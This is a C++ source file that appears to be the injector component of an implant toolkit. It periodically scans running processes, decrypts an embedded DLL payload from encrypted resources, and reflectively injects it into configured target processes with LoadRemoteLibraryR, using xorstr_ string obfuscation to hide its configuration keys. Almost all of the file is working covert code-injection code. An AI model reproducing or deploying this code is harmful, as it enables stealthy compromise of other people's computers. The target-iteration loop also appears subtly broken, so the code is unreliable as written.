//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include "../shared/LoadLibraryR.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stl/vector.h>
#include "../shared/coroutine.h"
#include "../shared/debug.h"
#include "../shared/math.h"
#include "../shared/resources.h"
#include "../shared/context.h"
#include "vr-config.h"
#include "gts.dll.h"

void injector_thread(context& ctx)
{
    int scan_time = 1;
    int scan_time_jitter = 1;
    const json_t* payloads = nullptr;
    if (const json_t* injector = json_getProperty(ctx.root, xorstr_("injector")))
        payloads = json_getProperty(injector, xorstr_("payloads"));

    if (payloads == nullptr || json_getType(payloads) != JSON_ARRAY)
    {
        LOG_DEBUG("Injector is not configured.");
        return;
    }

    stl::vector<uint32_t> pid_seen;
    stl::vector<uint32_t> pid_current;
    while (coroutine_loop::current_loop->is_active())
    {
        // User always runs one or more instances of explorer.exe. Find all these processes and get their session ids.
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE)
        {
            LOG_ERROR("CreateToolhelp32Snapshot failed %d", GetLastError());
            return;
        }

        pid_current.clear();
        PROCESSENTRY32 entry{};
        entry.dwSize = sizeof(entry);
        if (Process32First(hSnapshot, &entry))
        {
            do
            {
                bool seen = false;
                pid_current.push_back(entry.th32ProcessID);
                for (int i = 0; i < pid_seen.size() && !seen; i++)
                    seen = pid_seen[i] == entry.th32ProcessID;

                if (!seen)
                {
                    for (const json_t* payload = json_getChild(payloads); payload != nullptr; payload = json_getSibling(payload))
                    {
                        if (json_getType(payload) != JSON_OBJ)
                        {
                            LOG_WARNING("Incorrect injector json config.");
                            continue;
                        }

                        // Verify process name
                        if (const json_t* targets = json_getProperty(payload, xorstr_("targets")))
                        {
                            if (json_getType(targets) != JSON_ARRAY)
                            {
                                LOG_WARNING("Incorrect injector json config.");
                                continue;
                            }

                            for (const json_t* target = json_getChild(targets); target != nullptr; target = json_getSibling(targets))
                            {
                                if (stricmp(json_getValue(target), entry.szExeFile) == 0)
                                {
                                    // Initialize per-payload values
                                    stl::vector<uint8_t> payload_data;
                                    int64_t seed = 0;
                                    const char* payload_type;
                                    if (const json_t* item_type = json_getProperty(payload, xorstr_("type")))
                                    {
                                        payload_type = json_getValue(item_type);
                                        if (strcmp(json_getValue(item_type), xorstr_("gts")) == 0)
                                        {
                                            seed = combine_hash(vr_mutant_gts, entry.th32ProcessID);
                                            payload_data.resize(RSRC_GTS_SIZE);
                                            if (!resource_open(payload_data, RSRC_GTS_DATA, RSRC_GTS_DATA_SIZE, RSRC_GTS_KEY, RSRC_GTS_KEY_SIZE))
                                                payload_data.clear();
                                        }
                                    }

                                    if (!payload_data.empty())
                                    {
                                        if (!mutex_is_locked(seed))
                                        {
                                            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, entry.th32ProcessID);
                                            if (hProcess != nullptr)
                                            {
                                                if (LoadRemoteLibraryR(hProcess, payload_data.data(), payload_data.size(), nullptr))
                                                    LOG_DEBUG("%s injected to process %d", payload_type, entry.th32ProcessID);
                                                else
                                                    LOG_DEBUG("%s injection to process %d failed", payload_type, entry.th32ProcessID);
                                                CloseHandle(hProcess);
                                            }
                                        }
                                        else
                                            LOG_DEBUG("%s skips process %d because it is already injected.", payload_type, entry.th32ProcessID);
                                    }
                                }
                            }
                        }
                    }
                }

                memset(&entry, 0, sizeof(entry));
                entry.dwSize = sizeof(entry);
            } while (Process32Next(hSnapshot, &entry));
        }
        CloseHandle(hSnapshot);
        pid_seen = pid_current;
        yield(60_sec);
    }
}
